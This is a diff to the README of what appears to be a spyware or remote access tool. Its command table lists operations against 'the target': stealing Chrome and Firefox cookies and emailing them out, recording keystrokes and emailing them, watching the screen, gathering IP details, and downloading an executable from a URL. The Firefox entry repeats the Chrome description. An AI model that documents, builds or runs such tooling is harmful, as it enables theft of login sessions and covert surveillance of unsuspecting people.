@@ -33,8 +33,8 @@ run  eguo_eare.py in your server
 | Command | Description |
 | --- | --- |
 | `cookies-chrome yourEmail@gmail.com` | it get the chrome cookies and send it to your email |
-| `cookies-firefox` | it get the chrome cookies and send it to your email |
-| `keylog` | it get the Keystroke logs and send it to your email it will not end antel the user type '~' you can edit it in line 37 |
+| `cookies-firefox yourEmail@gmail.com` | it get the chrome cookies and send it to your email |
+| `keylog yourEmail@gmail.com` | it get the Keystroke logs and send it to your email it will not end antel the user type '~' you can edit it in line 37 |
 | `screensher` | it will show you what the target do like video converse   |
 | `ip-info` | it give you sum info about his ip  |
 | `dfile https://www.url.com/me.exe` | it will download the file from the url |
